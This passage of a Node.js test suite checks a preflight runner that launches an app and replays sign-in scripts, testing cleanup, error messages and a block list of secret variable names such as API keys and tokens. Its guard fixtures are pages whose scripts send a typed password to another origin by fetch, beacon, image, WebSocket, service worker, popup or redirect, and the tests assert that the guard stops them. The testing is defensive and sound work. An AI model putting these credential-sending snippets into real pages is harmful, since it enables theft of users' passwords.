      fs.writeFileSync(target, 'kept\n');
      fs.symlinkSync(target, log);
    }
    const started = Date.now();
    const done = run(here, { serve: { command: 'echo serving; node app/server.cjs',
      url: `http://127.0.0.1:${port}/`, cwd: here.dir } },
    { browsers: [process.execPath], env: { APP_PORT: String(port) } });
    assert.deepEqual(done.findings, [], kind);
    assert.ok(Date.now() - started < 10000, kind);
    assert.equal(fs.lstatSync(log).isFile(), true, kind);
    assert.equal(fs.readFileSync(log, 'utf8'), 'serving\n', kind);
    if (kind === 'link') assert.equal(fs.readFileSync(target, 'utf8'), 'kept\n');
    assert.equal(await isFree(port), true, kind);
  }
});

// A process that leaves the group of the serve command: it starts ESCAPED in a new session,
// writes its pid to FAKE_PID, and writes an entry of it to the folder FAKE_PROC, as
// /proc/<pid>/environ shows it on Linux. Then it starts the app.
const ESCAPED = `
const fs = require('fs');
const path = require('path');
const child = require('child_process').spawn(process.execPath,
  ['-e', 'setInterval(() => {}, 1000)'], { detached: true, stdio: 'ignore' });
child.unref();
fs.writeFileSync(process.env.FAKE_PID, String(child.pid));
fs.mkdirSync(path.join(process.env.FAKE_PROC, String(child.pid)), { recursive: true });
fs.writeFileSync(path.join(process.env.FAKE_PROC, String(child.pid), 'environ'),
  'PATH=/bin\\0QORY_CHECK_MARK=' + process.env.QORY_CHECK_MARK + '\\0');
require('./server.cjs');
`;

test('preflight: a process of the serve command that leaves its group stops with the app', async () => {
  const here = checkout();
  fs.writeFileSync(path.join(here.dir, 'app', 'escape.cjs'), ESCAPED);
  const port = await freePort();
  const fake = path.join(here.dir, 'proc');
  fs.mkdirSync(fake);
  const pidFile = path.join(here.dir, 'pid');
  let pid = null;
  try {
    const done = run(here, { serve: { command: 'node app/escape.cjs',
      url: `http://127.0.0.1:${port}/`, cwd: here.dir } },
    { browsers: [process.execPath], env: { APP_PORT: String(port), FAKE_PROC: fake,
      FAKE_PID: pidFile }, proc: process.platform === 'linux' ? undefined : fake });
    assert.deepEqual(done.findings, []);
    pid = Number(fs.readFileSync(pidFile, 'utf8'));
    const until = Date.now() + 2000;
    while (alive(pid) && Date.now() < until) { /* wait for the process to end */ }
    assert.equal(alive(pid), false, 'a process that left the group outlived the app');
  } finally {
    if (pid && alive(pid)) process.kill(pid, 'SIGKILL');
  }
});

// app returns the spec of the runner for the app of a checkout at port, which waits at the
// address of the port wait, with the browser and setups.
function appSpec(here, port, wait, more = {}) {
  return { serve: { command: `APP_PORT=${port} node app/server.cjs`,
    url: `http://127.0.0.1:${wait}/`, cwd: here.dir, log: path.join(here.dir, 'serve.log') },
  browser: null, setups: [], startMs: 60000, actionMs: 1000, signedInMs: 1000,
  limitMs: 60000, ...more };
}

test('preflight: SIGTERM while the runner waits for the app stops the app', async () => {
  const here = checkout();
  const port = await freePort();
  // The app listens on a port other than the address, so the runner keeps waiting.
  const ran = await runner(appSpec(here, port, await freePort()), { ms: 1500 });
  assert.equal(ran.status, 1);
  assert.equal(ran.out, '');
  assert.equal(await isFree(port), true);
});

// until resolves once check returns true, or rejects after ms.
async function until(check, ms, why) {
  const end = Date.now() + ms;
  while (!(await check())) {
    if (Date.now() > end) throw new Error(why);
    await new Promise((resolve) => { setTimeout(resolve, 100); });
  }
}

test('preflight: a runner whose parent ends stops the app and exits', async () => {
  const here = checkout();
  const port = await freePort();
  // The runner waits at another address, so it runs until its parent ends. The shell of the
  // serve command writes the pid of its parent, the runner.
  const spec = appSpec(here, port, await freePort());
  spec.serve.command = `echo $PPID > runner.pid; ${spec.serve.command}`;
  const parentFile = path.join(here.dir, 'parent.cjs');
  fs.writeFileSync(parentFile, `require('child_process').spawnSync(process.execPath, ` +
    `[${JSON.stringify(RUNNER)}], { input: ${JSON.stringify(JSON.stringify(spec))}, ` +
    'stdio: ["pipe", "ignore", "ignore"] });\n');
  const parent = childProcess.spawn(process.execPath, [parentFile], { stdio: 'ignore' });
  let pid = null;
  try {
    await until(async () => !(await isFree(port)), 10000, 'the app did not start');
    pid = Number(fs.readFileSync(path.join(here.dir, 'runner.pid'), 'utf8'));
    parent.kill('SIGTERM');
    await until(async () => !alive(pid) && await isFree(port), 3000,
      'the runner or the app outlived the parent');
  } finally {
    parent.kill('SIGKILL');
    if (pid && alive(pid)) process.kill(pid, 'SIGKILL');
  }
});

test('preflight: SIGKILL of the runner stops the process group of the serve command', async () => {
  const here = checkout();
  const port = await freePort();
  const child = childProcess.spawn(process.execPath, [RUNNER], { stdio: ['pipe', 'ignore',
    'ignore'] });
  child.stdin.end(JSON.stringify(appSpec(here, port, await freePort())));
  try {
    await until(async () => !(await isFree(port)), 10000, 'the app did not start');
    child.kill('SIGKILL');
    await until(() => isFree(port), 3000, 'the app outlived the runner');
  } finally {
    child.kill('SIGKILL');
  }
});

test('preflight: halt waits for the browser to exit, then removes its folder', { skip: NO_BROWSER }, async () => {
  const { Browser } = require(path.join(SKILL, 'lib/browser.cjs'));
  const browser = new Browser(BROWSER);
  await browser.start();
  await browser.page({ origin: 'http://127.0.0.1:9' });
  const { dir } = browser;
  assert.equal(fs.existsSync(dir), true);
  await browser.halt();
  assert.notEqual(browser.proc.exitCode === null && browser.proc.signalCode === null, true);
  assert.equal(fs.existsSync(dir), false);
  await new Promise((resolve) => { setTimeout(resolve, 1000); });
  assert.equal(fs.existsSync(dir), false);
});

test('preflight: a runner that fails while it waits for the app stops the app', async () => {
  const here = checkout();
  const port = await freePort();
  const wait = await freePort();
  // A module that throws in the runner 1 s after its start, and in no other process.
  const plant = path.join(here.dir, 'plant.cjs');
  fs.writeFileSync(plant, 'if (process.argv[1].endsWith("preflight-run.cjs")) ' +
    'setTimeout(() => { throw new Error("planted"); }, 1000);\n');
  const ran = await runner(appSpec(here, port, wait),
    { env: { NODE_OPTIONS: `--require ${plant}` } });
  assert.equal(ran.status, 3);
  assert.equal(await isFree(port), true);
  // The verb exits 3 with the cause of a runner that did not finish.
  assert.throws(() => run(here, { serve: { command: 'node app/server.cjs',
    url: `http://127.0.0.1:${wait}/`, cwd: here.dir } },
  { browsers: [process.execPath], env: { APP_PORT: String(port),
    NODE_OPTIONS: `--require ${plant}` } }), (error) => {
    assert.equal(error.message, 'End the run: the check of the app and the sign-in did not ' +
      'finish.');
    assert.deepEqual(error.more, ['The runner wrote "Error: planted".', 'Cause: the browser ' +
      'check did not finish: the runner exited with 3.']);
    return true;
  });
  assert.equal(await isFree(port), true);
});

test('preflight: sign-ins past the limit of the runner stop, with the app', { skip: NO_BROWSER }, async () => {
  const here = checkout();
  const port = await freePort();
  const ran = await runner(appSpec(here, port, port, { browser: BROWSER, limitMs: 4000,
    setups: [{ actions: [{ do: 'open', url: '/sign-in' },
      { do: 'wait', text: 'Order 1042', timeout_ms: 30000 }], names: [] }] }));
  assert.equal(ran.status, 0);
  assert.equal(JSON.parse(ran.out).unfinished, 'the sign-ins ran past the limit of 4 s');
  assert.equal(await isFree(port), true);
  // The preflight exits 3 with the cause, and the session ends the run.
  assert.throws(() => run(here, { serve: { command: 'node app/server.cjs',
    url: `http://127.0.0.1:${port}/`, cwd: here.dir }, scripts: [script('scenario-1',
    [...SIGN_IN, { do: 'wait', text: 'Never shown', timeout_ms: 30000 }])] },
  { browsers: [BROWSER], maxMs: 8000, env: { APP_PORT: String(port), DEMO_PASSWORD: 'x' } }),
  (error) => {
    assert.equal(error.message, 'End the run: the check of the app and the sign-in did not ' +
      'finish.');
    assert.deepEqual(error.more, ['Cause: the browser check did not finish: the sign-ins ran ' +
      'past the limit of 8 s.']);
    return true;
  });
  assert.equal(await isFree(port), true);
});

test('preflight: the replay gets only the variables that its setup lists', { skip: NO_BROWSER }, async () => {
  const here = checkout();
  const port = await freePort();
  const ran = await runner(appSpec(here, port, port, { browser: BROWSER,
    setups: [{ actions: [{ do: 'open', url: '/sign-in' },
      { do: 'type', target: '#password', variable: 'DEMO_PASSWORD' }], names: [] }] }),
  { env: { DEMO_PASSWORD: 'parcel-blue-41' } });
  assert.equal(JSON.parse(ran.out).signIns[0].why, 'action 2 (type into #password) failed: the ' +
    'variable DEMO_PASSWORD has no value');
  assert.equal(await isFree(port), true);
});

// fakeBrowser writes a browser to the checkout that writes its pid to the file pid, then runs
// shell, and returns { file, pid }.
function fakeBrowser(here, shell) {
  const file = path.join(here.dir, `browser-${++folders}`);
  const pid = `${file}.pid`;
  fs.writeFileSync(file, `#!/bin/sh\necho $$ > '${pid}'\n${shell}\n`, { mode: 0o755 });
  return { file, pid };
}

test('preflight: a browser that fails at its start writes the point of the browser', async () => {
  const cases = [
    // A message on the pipe that is no JSON.
    [`printf 'garbage\\000' >&4; exec sleep 97`, 'the browser failed: Browser.getVersion: the ' +
      'browser wrote a message that is no JSON'],
    // No message on the pipe.
    ['exec sleep 98', 'the browser failed: the browser did not start within 3 s', 3000],
    // A program that is no browser.
    ['exit 9', 'the browser failed: the browser exited before it started: {"code":9,' +
      '"signal":null}'],
  ];
  for (const [shell, why, browserMs] of cases) {
    const here = checkout();
    const port = await freePort();
    const browser = fakeBrowser(here, shell);
    const done = run(here, { serve: { command: 'node app/server.cjs',
      url: `http://127.0.0.1:${port}/`, cwd: here.dir }, scripts: [script('scenario-1', SIGN_IN)] },
    { browsers: [browser.file], browserMs,
      env: { APP_PORT: String(port), DEMO_PASSWORD: 'x' } });
    assert.equal(done.status, 1, shell);
    const [first, line] = done.findings[0].split('\n');
    assert.equal(first, 'End the session with points.json: the browser of the dev container ' +
      'failed.');
    assert.equal(line, `The sign-in of scenario-1 failed: ${why}.`);
    assert.deepEqual(points(here.root), [P01]);
    assert.equal(await isFree(port), true, shell);
    // The browser no longer runs.
    assert.equal(alive(Number(fs.readFileSync(browser.pid, 'utf8'))), false, shell);
  }
});

test('preflight: a demo script that types a key of qory or of an agent exits 3 before the app starts', async () => {
  const { runKey } = require(path.join(SKILL, 'lib/secrets.cjs'));
  assert.deepEqual(['QORY_RUN_KEY', 'ANTHROPIC_API_KEY', 'CLAUDE_CODE_OAUTH_TOKEN',
    'GITHUB_TOKEN', 'GH_TOKEN', 'GITLAB_TOKEN', 'GL_TOKEN', 'BITBUCKET_TOKEN',
    'GH_ENTERPRISE_TOKEN', 'GITHUB_ENTERPRISE_TOKEN', 'DEMO_PASSWORD', 'APP_TOKEN',
    'GITLAB_TOKEN_FILE', 'MY_GL_TOKEN'].map(runKey),
  [true, true, true, true, true, true, true, true, true, true, false, false, false, false]);
  const here = checkout();
  const setup = [...SIGN_IN.slice(0, 2), { do: 'type', target: '#password',
    variable: 'ANTHROPIC_API_KEY' }];
  assert.throws(() => run(here, { serve: { command: 'node app/server.cjs',
    url: 'http://127.0.0.1:9/', cwd: here.dir }, scripts: [script('scenario-1', setup)] },
  { browsers: [process.execPath] }), (error) => {
    assert.equal(error.message, 'Remove the key of qory or of the agent from the demo scripts, ' +
      'then run preflight again.');
    assert.deepEqual(error.more, ['A setup types ANTHROPIC_API_KEY, a variable of qory or of an ' +
      'agent.', 'Cause: a demo script types ANTHROPIC_API_KEY, which the run keeps from scripts.']);
    return true;
  });
  assert.equal(fs.existsSync(path.join(here.root, '.reports/preflight/serve.log')), false);
});

// pinnedPlan writes a folder of pulled artifacts with index.json and version 1 of a build plan
// whose Summary has the lines of summary and whose serve command is command, and returns it.
function pinnedPlan(summary, command) {
  const dir = path.join(tmp, `pinned-${++folders}`);
  const plan = path.join(dir, 'build-plan', 'main', 'v1');
  fs.mkdirSync(plan, { recursive: true });
  fs.writeFileSync(path.join(dir, 'index.json'), JSON.stringify({ artifacts: [{
    type: 'build-plan', name: 'main', approved_version: null, newest_version: 1,
    versions: [{ id: 'av_bp1', number: 1 }] }] }));
  fs.writeFileSync(path.join(plan, 'build-plan.md'), ['## Summary', '', 'One deliverable.',
    '', ...summary, '', '## Deliverables', '', '| Id | Change | Criteria | Files | Check |',
    '|---|---|---|---|---|', '| d-1 | Add the date. | ac-1 | `src/a.js` | scenario-1 |', '',
    '## Commands', '', '| Kind | Command | Result file | Source |', '|---|---|---|---|',
    '| targeted | `node --test` | `out/junit.xml` | repository: `package.json` |',
    `| serve | \`${command}\` | none | repository: \`package.json\` |`, ''].join('\n'));
  return dir;
}

// demoScript writes version 1 of the demo script of scenario-1, with setup, to root, and an
// index.json that lists it.
function demoScript(root, setup = SIGN_IN) {
  const dir = path.join(root, 'demo-script', 'scenario-1', 'v1');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'scenario-1.json'), JSON.stringify(script('scenario-1', setup)));
  fs.writeFileSync(path.join(root, 'index.json'),
    JSON.stringify({ artifacts: [entry('scenario-1', [[1]])] }));
}

test('preflight verb: with the app stopped, the session ends escalate, and the point has its fix', async () => {
  const here = checkout();
  assert.equal(childProcess.spawnSync('git', ['-C', here.dir, 'init', '-q']).status, 0);
  const port = await freePort();
  const command = 'node app/missing.cjs';
  const pinned = pinnedPlan([`App address: \`http://127.0.0.1:${port}/\``], command);
  // The demo scripts come from the artifact folder of the session, not from the folder of
  // the build plans.
  demoScript(here.root);
  const deps = { cwd: here.dir, artifacts: [here.root],
    preflight: { browsers: [process.execPath], startMs: 5000 } };
  const done = call(['preflight', '--artifacts', pinned], deps);
  assert.equal(done.status, 1, done.out + done.err);
  const lines = done.out.trim().split('\n');
  assert.equal(lines[0], 'End the session with points.json: the app did not start in the dev ' +
    'container.');
  assert.equal(lines.at(-1), 'Checked the browser and the app: 1 of 2 parts is missing, and ' +
    'points.json has a point run_again for each.');
  // The point contains the missing part, and its fix line has the step to take.
  const file = path.join(here.root, 'points.json');
  const [point] = points(here.root);
  assert.equal(point.text, P02_TEXT);
  assert.equal(point.fix, `Make ${command} start the app in the dev container, then run ` +
    'another round.');
  assert.ok(fs.existsSync(path.join(here.root, '.reports/preflight/serve.log')));
  // Nothing goes to the folder of the pulled artifacts.
  assert.equal(fs.existsSync(path.join(pinned, 'points.json')), false);
  assert.equal(call(['check', 'points', file], { cwd: here.dir }).status, 0);
  const { args, env } = stub();
  const ended = call(['end', here.root], { env });
  assert.equal(ended.status, 0, ended.out + ended.err);
  assert.deepEqual(fs.readFileSync(args, 'utf8').split('\n')
    .filter((line) => line.startsWith('run verdict')), [`run verdict escalate --points ${file}`]);
});

test('preflight verb: each input that is missing or broken, and a runner with no result, exit 3 with their causes, and bad arguments exit 2', () => {
  const here = checkout();
  assert.equal(childProcess.spawnSync('git', ['-C', here.dir, 'init', '-q']).status, 0);
  const deps = { cwd: here.dir, artifacts: [here.root],
    preflight: { browsers: [process.execPath], startMs: 1000 } };
  // causeOf returns the cause of the output of an exit 3.
  const causeOf = (out) => out.split('\n').find((line) => /^ *Cause: /.test(line)).trim();
  const done = call(['preflight', '--artifacts', pinnedPlan([], 'npm run dev')], deps);
  assert.equal(done.status, 3, done.out + done.err);
  assert.equal(done.out.split('\n')[0], 'Add the line "App address: <url>" to ## Summary of the ' +
    'build plan, then push it.');
  assert.equal(causeOf(done.out), 'Cause: the build plan has no App address.');
  assert.equal(fs.existsSync(path.join(here.root, 'points.json')), false);
  // A serve command with no demo script in the artifact folder of the session.
  const address = ['App address: `http://127.0.0.1:9/`'];
  const none = call(['preflight', '--artifacts', pinnedPlan(address, 'node app/server.cjs')],
    deps);
  assert.equal(none.status, 3, none.out + none.err);
  assert.equal(none.out.split('\n')[0], 'Run `qory artifact pull demo-script`, then run ' +
    'preflight again.');
  assert.equal(causeOf(none.out), 'Cause: no demo script exists for the app.');
  // A demo script that types a key of qory or of an agent.
  demoScript(here.root, [...SIGN_IN.slice(0, 2), { do: 'type', target: '#password',
    variable: 'QORY_RUN_KEY' }]);
  const key = call(['preflight', '--artifacts', pinnedPlan(address, 'node app/server.cjs')],
    deps);
  assert.equal(key.status, 3, key.out + key.err);
  assert.equal(causeOf(key.out), 'Cause: a demo script types QORY_RUN_KEY, which the run keeps ' +
    'from scripts.');
  assert.equal(fs.existsSync(path.join(here.root, '.reports/preflight/serve.log')), false);
  demoScript(here.root);
  // A runner of the app that prints no result, here a node that cannot start, exits 3, with
  // no point.
  const fault = call(['preflight', '--artifacts', pinnedPlan(
    ['App address: `http://127.0.0.1:9/`'], 'node app/server.cjs')],
  { ...deps, env: { ...process.env, NODE_OPTIONS: `--require ${path.join(tmp, 'none.cjs')}` } });
  assert.equal(fault.status, 3, fault.out + fault.err);
  assert.equal(fault.out.split('\n')[0], 'End the run: the check of the app and the sign-in did ' +
    'not finish.');
  assert.equal(causeOf(fault.out), 'Cause: the browser check did not finish: the runner exited ' +
    'with 1.');
  assert.equal(fs.existsSync(path.join(here.root, 'points.json')), false);
  // A folder of pulled artifacts whose index.json lists no build plan.
  const empty = path.join(tmp, `pinned-${++folders}`);
  fs.mkdirSync(empty);
  fs.writeFileSync(path.join(empty, 'index.json'), JSON.stringify({ artifacts: [] }));
  const noPlan = call(['preflight', '--artifacts', empty], deps);
  assert.equal(noPlan.status, 3, noPlan.out + noPlan.err);
  assert.equal(noPlan.out.split('\n')[0], 'Push the build plan, then pull the artifacts: ' +
    'index.json lists no version of build-plan.');
  assert.equal(causeOf(noPlan.out), 'Cause: the build plan is missing.');
  // A demo script that is no JSON, and one that breaks its schema.
  const scriptFile = path.join(here.root, 'demo-script', 'scenario-1', 'v1', 'scenario-1.json');
  for (const [text, first] of [
    ['{ "scenario":', 'Write demo-script scenario-1 version 1 as valid JSON.'],
    [JSON.stringify({ scenario: 'scenario-1' }), 'Push a demo script of scenario-1 that ' +
      'passes its check, then pull it.']]) {
    fs.writeFileSync(scriptFile, text);
    const broken = call(['preflight', '--artifacts', pinnedPlan(address, 'node app/server.cjs')],
      deps);
    assert.equal(broken.status, 3, broken.out + broken.err);
    assert.equal(broken.out.split('\n')[0], first);
    assert.equal(causeOf(broken.out), 'Cause: a demo script breaks its format rules.');
  }
  // index.json counts version 2, and the store has no folder of it; then a folder of version 1
  // with no file of the script.
  demoScript(here.root);
  fs.writeFileSync(path.join(here.root, 'index.json'),
    JSON.stringify({ artifacts: [entry('scenario-1', [[1], [2]])] }));
  const lacking = call(['preflight', '--artifacts', pinnedPlan(address, 'node app/server.cjs')],
    deps);
  assert.equal(lacking.status, 3, lacking.out + lacking.err);
  assert.equal(lacking.out.split('\n')[0], 'Run `qory artifact pull demo-script --version 2`, ' +
    'then check again.');
  assert.equal(causeOf(lacking.out), 'Cause: the run could not read version 2 of a demo script.');
  demoScript(here.root);
  fs.rmSync(scriptFile);
  const noFile = call(['preflight', '--artifacts', pinnedPlan(address, 'node app/server.cjs')],
    deps);
  assert.equal(noFile.status, 3, noFile.out + noFile.err);
  assert.equal(noFile.out.split('\n')[0], 'Pull the artifacts again.');
  assert.equal(causeOf(noFile.out), 'Cause: the run could not read version 1 of a demo script.');
  for (const argv of [['preflight', '--artifacts'], ['preflight', 'now'],
    ['preflight', '--inputs']]) {
    assert.equal(call(argv, deps).status, 2, argv.join(' '));
  }
});

// The pages of the guard tests, each with a sign-in form whose submit sends the password to
// the origin other: a form or window.open in a new window, fetch, sendBeacon, an image, a
// WebSocket, a service worker of the app that sends each form it gets there, a script that
// opens an address there, or a form that posts there. /meta refreshes to other at its load,
// /object shows a page of other in an object, and /blank-frame a field in a frame.
function guardPages(other, otherHost) {
  const page = (body) => `<!doctype html><html><body>${body}</body></html>`;
  const form = (attrs) => `<form id="f" ${attrs}><input id="password" name="password">` +
    '<button id="go" type="submit">Sign in</button></form>';
  const send = (code) => form(`onsubmit="event.preventDefault();const v=password.value;${code};` +
    'location.href=\'/orders\'"');
  return {
    '/popup-form': page(form(`method="post" action="${other}/popup-form" target="_blank"`)),
    '/popup-open': page(form('onsubmit="event.preventDefault();' +
      `window.open('${other}/popup-open?v='+password.value)"`)),
    '/fetch': page(send(`fetch('${other}/fetch',{method:'POST',body:v,mode:'no-cors'})`)),
    '/beacon': page(send(`navigator.sendBeacon('${other}/beacon',v)`)),
    '/image': page(send(`new Image().src='${other}/img?v='+v`)),
    '/socket': page(send(`new WebSocket('ws://${otherHost}/ws?v='+v)`)),
    '/worker': page(`<p id="s">wait</p>${form('method="post" action="/session"')}` +
      '<script>navigator.serviceWorker.register("/sw.js").then(() => ' +
      'navigator.serviceWorker.ready).then(() => { if (navigator.serviceWorker.controller) ' +
      'document.getElementById("s").textContent = "worker-ready"; else location.reload(); })' +
      '</script>'),
    '/sw.js': 'self.addEventListener("install", () => self.skipWaiting());\n' +
      'self.addEventListener("activate", (e) => e.waitUntil(clients.claim()));\n' +
      'self.addEventListener("fetch", (e) => { if (e.request.method !== "POST") return;\n' +
      '  e.respondWith(e.request.clone().text().then((body) => fetch(' +
      `"${other}/worker", { method: "POST", body, mode: "no-cors" }).catch(() => {}))\n` +
      '    .then(() => new Response("<h1>Order 1042</h1>", ' +
      '{ headers: { "content-type": "text/html" } }))); });\n',
    '/script-nav': page(form('onsubmit="event.preventDefault();' +
      `location.href='${other}/nav?v='+password.value"`)),
    '/post': page(form(`method="post" action="${other}/post"`)),
    '/meta': '<!doctype html><html><head><meta http-equiv="refresh" ' +
      `content="0;url=${other}/meta"></head><body>${form('method="post" action="/session"')}</body></html>`,
    '/object': page(`<object id="ob" data="${other}/object" type="text/html" width="400" ` +
      `height="120"></object>${form('method="post" action="/session"')}`),
    '/blank-frame': page('<iframe id="fr" src="about:blank"></iframe>' +
      `${form('method="post" action="/session"')}<script>document.getElementById("fr")` +
      '.contentDocument.body.innerHTML = "<input id=inner>";</script>'),
    '/orders': page('<h1>Order 1042</h1>'),
  };
}

// The result of the sign-in of each guard page: outside, a fail with the origin of the
// other server; pass, a sign-in that passes, since the request fails and the app shows its
// orders; or frame, a fail at a type into a frame. type is the target of the type action.
const GUARD_CASES = {
  'popup-form': { result: 'outside' }, 'popup-open': { result: 'outside' },
  fetch: { result: 'pass' }, beacon: { result: 'pass' }, image: { result: 'pass' },
  socket: { result: 'pass' }, worker: { result: 'pass' },
  'script-nav': { result: 'outside' }, post: { result: 'outside' },
  meta: { result: 'outside' }, object: { result: 'outside', type: '#ob' },
  'blank-frame': { result: 'frame', type: '#fr' },
};

// listen starts an http server with handler on host, and resolves to it and its port.
function listen(handler, host) {
  return new Promise((resolve) => {
    const server = http.createServer(handler);
    server.listen(0, host, () => resolve({ server, port: server.address().port }));
  });
}

// guard replays the sign-in of each of cases on the guard pages of an app on appHost, and
// asserts that the server of another origin on 127.0.0.1 gets no request, that each new
// window closes and writes its origin to outside, and that no page outside the tab remains.
async function guard(appHost, cases) {
  const { Browser } = require(path.join(SKILL, 'lib/browser.cjs'));
  const got = [];
  const other = await listen((req, res) => {
    got.push(`${req.method} ${req.url}`);
    res.end('other');
  }, '127.0.0.1');
  other.server.on('upgrade', (req, socket) => {
    got.push(`UPGRADE ${req.url}`);
    socket.destroy();
  });
  const otherOrigin = `http://127.0.0.1:${other.port}`;
  const pages = guardPages(otherOrigin, `127.0.0.1:${other.port}`);
  const app = await listen((req, res) => {
    req.resume();
    const at = req.url.split('?')[0];
    if (req.method === 'POST') {
      res.writeHead(303, { Location: '/orders' });
      res.end();
      return;
    }
    res.writeHead(200, { 'content-type': at.endsWith('.js') ? 'text/javascript'
      : 'text/html' });
    res.end(pages[at] || pages['/orders']);
  }, appHost);
  const base = `http://${appHost}:${app.port}/`;
  const origin = new URL(base).origin;
  const browser = new Browser(BROWSER, { origin });
  try {
    await browser.start();
    for (const name of cases) {
      got.length = 0;
      const page = await browser.page({ origin });
      const actions = [{ do: 'open', url: `/${name}` },
        ...(name === 'worker' ? [{ do: 'wait', text: 'worker-ready', timeout_ms: 8000 }] : []),
        { do: 'type', target: GUARD_CASES[name].type || '#password',
          variable: 'DEMO_PASSWORD' },
        ...(GUARD_CASES[name].type ? [] : [{ do: 'click', target: '#go' }])];
      const done = await replay.signIn(page, actions,
        { base, env: { DEMO_PASSWORD: 'parcel-blue-41' }, signedInMs: 2000 });
      await new Promise((resolve) => { setTimeout(resolve, 1000); });
      const { targetInfos } = await browser.send('Target.getTargets');
      const left = targetInfos.filter((one) => one.browserContextId === page.browserContextId &&
        one.type === 'page');
      await page.close();
      assert.deepEqual(got, [], name);
      assert.deepEqual(left.map((one) => one.targetId), [page.targetId], name);
      const { result } = GUARD_CASES[name];
      if (result === 'outside') {
        assert.equal(done.ok, false, name);
        assert.equal(done.outside, otherOrigin, name);
        assert.match(done.why, new RegExp(`the page opened ${otherOrigin}, outside the app`),
          name);
      } else if (result === 'frame') {
        assert.deepEqual(done, { ok: false, outside: null,
          why: 'action 2 (type into #fr) failed: the focus is in a frame' }, name);
      } else {
        assert.equal(done.ok, true, `${name}: ${done.why}`);
      }
    }
  } finally {
    await browser.stop();
    app.server.close();
    other.server.close();
  }
}

test('preflight: no request of the sign-in reaches another origin, and a new window closes', { skip: NO_BROWSER }, async () => {
  await guard('127.0.0.1', Object.keys(GUARD_CASES));
});

// The first IPv4 address of this machine that is not loopback, or null for none.
const LAN = Object.values(os.networkInterfaces()).flat()
  .find((one) => one && one.family === 'IPv4' && !one.internal);
const NO_LAN = NO_BROWSER || (!LAN && 'this machine has no address other than loopback');

test('preflight: the guard holds for an app whose host is not loopback', { skip: NO_LAN }, async () => {
  // A service worker needs a secure origin, and http on such a host is none.
  await guard(LAN.address, Object.keys(GUARD_CASES).filter((name) => name !== 'worker'));
});
